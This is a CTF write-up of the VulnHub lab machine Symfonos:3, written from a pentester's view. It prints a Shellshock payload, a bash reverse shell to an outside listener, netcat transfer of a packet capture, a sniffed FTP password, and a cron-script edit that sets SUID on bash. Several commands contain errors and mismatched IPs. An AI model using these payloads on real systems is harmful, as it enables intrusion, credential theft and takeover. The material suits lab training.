---
layout: single
title: '<span class="vulnhub">machines synfonos3 - /VulnHub</span>'
excerpt: "Synfonos3, hadesPC, synfonos5 are a machines from Vulnhub platform. I recommend you do these CTF because for the eCCptv2 it will be something like this."
date: 2023-02-02
categories:
  - vulnhub
  - machine
tags:  
  - wordpress
  - bruteforce
  - suid
  - privilege-escalation
  - web
  - php
  - reverse-shell
  - wpscan
  - hydra
  - linux
  - pivoting
  - Fuzzing
toc: true
toc_label: "Content"
toc_sticky: true
show_time: true
---

Synfonos3, hadesPC, synfonos5 are a machines from Vulnhub platform. I recommend you do these CTF because for the eCCptv2 it will be something like these cluster, another very strong point to mention is that works well doings these machine as pivoting machines


**We will see all this from the perspective and methodology of a penetration test.**

- Links to the machines: [Synfonos3](https://www.vulnhub.com/entry/symfonos-31,332/)
- Difficulty assigned by Vulnhub: Medium
- The IP of the machine in my case will be: 192.168.100.61 (You will have a different ip so change it for all steps)

Let's get them!

## Enumeration

we have to figure out the ip of the machine so we need to use arp scan tool 
To do this we will make use of arp-scan and use a series of parameters that will make your search faster.

```bash
arp-scan -Iens33 --localnet
```

The explanation of the meaning of each parameter is:
- ```-I-``` : We have to indicate our interface in my case will be ens33 in your case could be eth0.
- ```--localnet``` : We indicate that the search will be for our localnet.
output
```php
Interface: ens33, type: EN10MB, MAC: 00:0c:29:f2:37:49, IPv4: 192.168.100.53
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.1	64:5e:10:84:35:47	(Unknown)
192.168.100.5	58:9a:3e:6e:27:40	(Unknown)
192.168.100.6	34:25:be:68:6f:95	(Unknown)
192.168.100.10	90:e8:68:d0:da:47	(Unknown)
192.168.100.7	24:18:c6:dc:bd:cd	(Unknown)
192.168.100.61	00:0c:29:71:6f:76	VMware, Inc.
192.168.100.51	06:1f:61:f8:6e:4f	(Unknown: locally administered)
```
now we know the ip for the machine that we can reach, now we have to enumerate to figure out what kind of machine is based on the TTL which is time to life.
```bash
ping -c3 192.168.100.61
```
output:
```php
PING 192.168.100.61 (192.168.100.61) 56(84) bytes of data.
64 bytes from 192.168.100.61: icmp_seq=1 ttl=64 time=0.334 ms
64 bytes from 192.168.100.61: icmp_seq=2 ttl=64 time=0.291 ms
64 bytes from 192.168.100.61: icmp_seq=3 ttl=64 time=0.357 ms

--- 192.168.100.61 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2031ms
rtt min/avg/max/mdev = 0.291/0.327/0.357/0.027 ms
```

- ```-TTL-``` : means the time to life of the machine, if it's 64 the machine is Linux, or if it's 124 the machine will be windows.
- ```--3 packets transmitted, 3 received``` : with this output means that the machine is activa.

The first thing we will do when you know the IP and when you know that the machine is active we have to scan the target and see which ports are open.
To do this we will make use of nmap and use a series of parameters that will make our scan faster.:

```bash
nmap -p- --open -sS -Pn --min-rate 5000 -vvv -n 192.100.61
```
the meaning of each parameter is.:
- ```-p-``` : We indicate that the scan will be done for all ports.
- ```--open``` : We indicate that we are only interested in ports that are open.
- ```-sS``` : This flag indicates that we want to do a "SYN Scan" which means that the packets we will send will never complete the TCP connections and that will make our scan much less intrusive and quieter.
- ```-Pn``` : With this option we indicate that we do not want to do host discovery (since we know who our target is).
- ```--min-rate 5000``` : This flag can be exchanged for ```-T5```, both are intended to make our scanning faster (and noisier...). To be more detailed this flag indicates that we don't want to send less than 5,000 packets per second.
- ```-v``` : (verbose) To see which ports appear as we go along.
- ```-n``` : We don't want DNS resolution to be performed, since we are scanning an IP, not a domain.
output

```php
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 08:11 CST
Initiating ARP Ping Scan at 08:11
Scanning 192.168.100.61 [1 port]
Completed ARP Ping Scan at 08:11, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 08:11
Scanning 192.168.100.61 [65535 ports]
Discovered open port 21/tcp on 192.168.100.61
Discovered open port 22/tcp on 192.168.100.61
Discovered open port 80/tcp on 192.168.100.61
Completed SYN Stealth Scan at 08:11, 6.06s elapsed (65535 total ports)
Nmap scan report for 192.168.100.61
Host is up, received arp-response (0.00075s latency).
Scanned at 2023-04-17 08:11:39 CST for 6s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:71:6F:76 (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.31 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

At this point we know that there are 3 open ports: 80 (HTTP) and 22 (SSH), 21 (FTP) seeing this we have to make under consideration that we have 2 vias of get into the machine the SSH port and port 80 (at least to the outside), it can be deduced that the only way to enter the machine is through these services.

 once we know which ports are open we must perform the scan to those ports by running a series of scripts in order to obtain more information: server version, technology, possible vulnerabilities, etc...

```bash
nmap -sV -sC -p 80,22,21 -Pn -n -min-rate 5000 10.10.198.171 -oN targeted
```


Where :

- ```-sV``` : If possible, it will show the version of the service running on each port.
- ```-A``` : We will run all relevant scripts (provided by nmap) on these ports.
- ```-p 80,22,21```: Open ports.
- ```-oN```: export the output to nmap format

Getting this output:

```php
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 08:22 CST
Nmap scan report for 192.168.100.61
Host is up (0.00047s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd64727680517ba8c7fdb266fab6980c (RSA)
|   256 74e59a5a4c1690cad8f7c778e75a8681 (ECDSA)
|_  256 3ce40bb9dbbf018ab79c42bccb1e416b (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
MAC Address: 00:0C:29:71:6F:76 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.85 seconds
```

To find out what we are dealing with, we will run **WhatWeb** in order to find the codename as well

```bash
http://192.168.100.61 [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[192.168.100.61]
```

seems that does not give us a lo of information.

So let's visit the web the port 


After testing each of the attacks SSRF,SQLI,PATHtraversal I did not find anything relevant, on the other hand we are able to search for possible routes using gobuster for example

Since there seems to be no more information in sight, we will proceed to do *Fuzzing*, which consists of making requests to the server of several routes extracted from a dictionary with the objective of obtaining routes that exist. For this we will use *Wfuzz* although another powerful tool is *Ffuf* or gobuster.

- With wfuzz would be:

```bash
wfuzz -c -L --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.100.61///FUZZ
```

- With ffuf would be:

```bash
ffuf -u http://192.168.100.61//FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200 -c -t 200
```
- With gobuster would be:
```bash
gobuster dir -u http://192.168.100.61/ -w /usr/share/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 --add-slash
```

At this point we found the following routes:

```
/icons/               (Status: 403) [Size: 279]
/cgi-bin/             (Status: 403) [Size: 279]
/gate/                (Status: 200) [Size: 202]
/server-status/       (Status: 403) [Size: 279]
```

seems to be vulneral at shellshock let's figure out more routes using cgi/bin as a based for example.

```bash
gobuster dir -u http://192.168.100.61/cgi-bin/ -w /usr/share/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 --add-slash
```
seems that we found another one let's find what's inside of these routes.
```
/underworld/          (Status: 200) [Size: 62]
```

- and just like we spoke it has a vulnerability called ShellShock because we can see a command called uptime in this route.

```bash
❯ curl -s -X GET "http://192.168.100.61/cgi-bin/underworld/"
 10:24:25 up  2:04,  0 users,  load average: 0.02, 1.15, 1.22
 ```
 
 ## Gaining Access
 

let's take an advantage of ```shellShock```, using echo + the vulnerability,because something does not work without echo.

```
curl -s -X GET "http://192.168.100.61/cgi-bin/underworld/" -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
cerberus
```
so if we are able to execute commands let's make a [reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) here's a list of it if you don't how to make it.

```
❯ curl -s -X GET "http://192.168.100.61/cgi-bin/underworld/" -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/192.168.100.53/443 0>&1"
```


and on your own machine you have to stay hearing on port 443  ```nc -nlvp 443```, in order to make the connection successfully.

## Privilage Escalation

now that we gain access we have to do the treatment of the TTY because if we don't do it, we will be unable to execute shorcuts such as CTRL + C or CTRL + L or the stty size
let's make it ! press enter to go back to your reverse shell.
first we need to execute this script.

- ```-script /dev/null -c bash``` : change the value of the TTY.
- ```-Ctrl + z``` : end  the session of our reverse shell (for a while).
- ```-stty raw -echo;fg```: from our machine we have to change it.
- ```-export TERM=xterm```: change the value of the XTERM.
- ```-stty size```: now you have to verify your rows and columns from your personal desktop. in order to replace them in your reverse shell.
- ```-stty size```: verify you rows and columns.
- ```-stty rows {} columns {}```: change your rows and columns.

Let's find SUID permissions.

```bash
cerberus@symfonos3:/$ find \-perm -4000 -user root 2>dev/null
./usr/sbin/exim4
./usr/bin/newgrp
./usr/bin/chsh
./usr/bin/pkexec
./usr/bin/chfn
./usr/bin/gpasswd
./usr/bin/passwd
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/openssh/ssh-keysign
./bin/umount
./bin/mount
./bin/ping
./bin/su
```
seems that we can take root from pkexec we can use the pwnkid exploit  or the exim4.
but we will explote another pontetial way.

we will use this Monitor called [Pspy](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1) in order to find tasks executed by root. 

so you have to download it from github 
the first step when you have it in you own machine is sharing it from port 80 using python.
example

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.100.61 - - [17/Apr/2023 16:08:00] "GET /pspy HTTP/1.1" 200 -
----------------------------------------
Exception occurred during processing of request from ('192.168.100.61', 43590)

you have to wget it from your IP in my case will be 192.168.100.53

cerberus@symfonos3:/tmp$ wget http://192.168.100.53/pspy
--2023-04-17 16:41:30--  http://192.168.100.53/pspy
Connecting to 192.168.100.53:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy'

pspy                                                          100%[=================================================================================================================================================>]   2.96M  --.-KB/s    in 0.03s   

2023-04-17 16:41:30 (111 MB/s) - 'pspy' saved [3104768/3104768]
```
now that we have it, we must execute it, in order to find tasks executed by root.
```bash
cerberus@symfonos3:/$ ./pspy64
```
appears something weird 
```bash
2023/04/17 17:19:01 CMD: UID=0     PID=10431  | /bin/sh -c /usr/bin/curl --silent -I 127.0.0.1 > /opt/ftpclient/statuscheck.txt 
2023/04/17 17:20:01 CMD: UID=0     PID=10433  | /usr/sbin/CRON -f 
2023/04/17 17:20:01 CMD: UID=0     PID=10432  | /usr/sbin/cron -f 
2023/04/17 17:20:01 CMD: UID=0     PID=10434  | /usr/sbin/CRON -f 
2023/04/17 17:20:01 CMD: UID=0     PID=10435  | /usr/sbin/CRON -f 
2023/04/17 17:20:01 CMD: UID=0     PID=10437  | /bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py
```
according with pspy theres an schedule cronTab execute every 3 minutes so let's check it.
```bash
cerberus@symfonos3:/tmp$ ls -l /opt/ftpclient/ftpclient.py
ls: cannot access '/opt/ftpclient/ftpclient.py': Permission denied
```
but it appears locked because i don't belong to this group called hades.

```bash
cerberus@symfonos3:/tmp$ ls -l /opt/          
total 4
drwxr-x--- 2 root hades 4096 Apr  6  2020 ftpclient
```
seems that we belong to a group that is able to capture traffic because of "pcap".
- ```-cerberus@symfonos3:/tmp$ id
uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)```

we can try to make a sniffer using TCPdump in order to capture possible users and passwords. 
- ```-cerberus@symfonos3:/tmp$ id
uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)```
we  can try it because if i am able to listen from cpcap  tcdump -D ip a loop back we can make a packet sniffer with TCPdump in order to might capture packets from that crontab we might can get crendials or something like that.

first of all we need to verify which interfaces we are able to capture.

```bash
cerberus@symfonos3:/$ tcpdump -D
1.ens33 [Up, Running]
2.ens34 [Up, Running]
3.any (Pseudo-device that captures on all interfaces) [Up, Running]
4.lo [Up, Running, Loopback]
5.nflog (Linux netfilter log (NFLOG) interface)
6.nfqueue (Linux netfilter queue (NFQUEUE) interface)
7.usbmon1 (USB bus number 1)
8.usbmon2 (USB bus number 2)
cerberus@symfonos3:/$ 
```
it looks like we can capture traffic from all of these, let's capture them.

```
cerberus@symfonos3:/$ tcpdump -i lo -v -w thecap.cap

send the capture for netcat from the target machine to our machine 
ex
nc 192.168.11.53 < thecap.cap

for

nc -nlvp 443 > thecap.cap

```
sniff the trafic using tshark.
```bash
❯ tshark -r Thecap.cap -Y"ftp" 2>/dev/null
```
looks like we have potential users and password .
hades:PTpZTfU4vxgzvRBE

let's do a user pivoting using the credentials that we snifffed.

```bash
hades@symfonos3:/tmp$ whoami
hades
```
now let's verify how we can take adventage of the task that we were seeing executing with pspy.
```bash
2023/04/17 22:50:01 CMD: UID=0     PID=40488  | /bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 
```
now if we open this task seems that it's writable and it looks like we have to os.import the python libraries because it is a script made with python

```bash
hades@symfonos3:/$ find \-group gods -writable 2>dev/null
./usr/lib/python2.7
./etc/python2.7/sitecustomize.py
./opt/ftpclient/ftpclient.py 

we have to open with nano and change a few thing on it 
import os
import sys
os.system("chmod u+s bin/bash"
```

now how the root user executes this script. 

```bash
hades@symfonos3:/tmp$ bash -p
bash-4.2# whoami
root
```
that's how we will gain privilages.

```bash
bash-4.2# whoami
root
```
and here's the flag.

```bash
hades@symfonos3: cd /root
hades@symfonos3: ls
proof.txt
hades@symfonos3: cat proof.txt

        Congrats on rooting symfonos:3!
                                        _._
                                      _/,__\,
                                   __/ _/o'o
                                 /  '-.___'/  __
                                /__   /\  )__/_))\
     /_/,   __,____             // '-.____|--'  \\
    e,e / //  /___/|           |/     \/\        \\
    'o /))) : \___\|          /   ,    \/         \\
     -'  \\__,_/|             \/ /      \          \\
             \_\|              \/        \          \\
             | ||              <    '_    \          \\
             | ||             /    ,| /   /           \\
             | ||             |   / |    /\            \\
             | ||              \_/  |   | |             \\
             | ||_______________,'  |__/  \              \\
              \|/_______________\___/______\_             \\
               \________________________     \__           \\        ___
                  \________________________    _\_____      \\ _____/
                     \________________________               \\
        ~~~~~~~        /  ~~~~~~~~~~~~~~~~~~~~~~~~~~~  ~~ ~~~~\\~~~~
            ~~~~~~~~~~~~~~    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~    //

        Contact me via Twitter @zayotic to give feedback!

#
```
Happy hacking !
